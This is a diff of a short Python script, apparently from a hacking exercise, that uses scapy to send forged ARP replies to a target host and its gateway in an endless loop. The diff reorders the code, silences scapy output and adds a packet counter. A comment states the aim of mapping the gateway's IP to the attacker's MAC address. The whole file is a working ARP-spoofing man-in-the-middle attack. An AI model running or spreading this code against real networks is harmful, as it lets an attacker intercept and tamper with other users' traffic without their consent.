@@ -20,22 +20,26 @@ def get_mac(ip):
     return ans_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip,):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)  # command change the default gateway IP to attacker MAC addr
-
-
-#get_mac("192.168.159.133")
-keep_looping = True
-
-while keep_looping:
-    spoof("192.168.159.133", "192.168.159.2")
-    spoof("192.168.159.2", "192.168.159.133")
-    time.sleep(2)
-
 """
 print(packet.show())
 print(packet.summary())
 summarize the packet generate above
 """
+
+
+def spoof(target_ip, spoof_ip,):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)  # command change the default gateway IP to attacker MAC addr
+
+
+keep_looping = True
+i = 0
+while keep_looping:
+    spoof("192.168.159.133", "192.168.159.2")
+    spoof("192.168.159.2", "192.168.159.133")
+    time.sleep(2)
+    print(f"sending the {i + 2} packet")
+    i+=2
+
+
